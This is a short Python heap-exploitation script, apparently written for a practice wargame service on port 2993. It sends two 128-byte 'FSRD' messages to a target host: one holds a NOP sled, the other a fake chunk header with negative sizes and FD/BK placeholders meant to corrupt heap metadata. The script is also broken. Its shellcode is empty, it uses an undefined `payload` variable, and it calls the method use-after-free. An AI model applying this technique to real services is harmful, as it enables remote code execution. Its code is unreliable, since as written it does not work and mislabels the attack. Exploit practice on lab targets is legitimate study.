import os
import struct
import sys
import telnetlib
import socket


size_reqd=128
socketObject = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socketObject.connect((sys.argv[1],2993))


#assuming msg will be always smaller than 128
#The required size of message is 128 bytes INCLUDING "FSRD" string
#The msg must begin with "FSRD"
payload1="FSRD"
shellcode="\x90"*20
shellcode+=""
payload+="\x90"*(123-len(shellcode))
payload1+="/"

socketObject.sendall(payload1)


#This is the part that will replace from the top of chunk2 after memmov,in order (prev_size+curr_size+BBBB (FD)+CCCC(BK))
payload2_header = "\xfc\xff\xff\xff" + "\xfe\xff\xff\xff" + "BBBB" + "CCCC"

payload2 = "FSRD" + "ROOT" + "X"*(128-9-len(payload2_header)) + "/" + payload2_header

socketObject.sendall(payload2)


socketObject.close()



##So to execute this we will again employ the "use-after-free exploit technique"
##Each request to the remote service must follow an enforced pattern of exact length of 128 bytes and the first 4 bytes should be FSRD
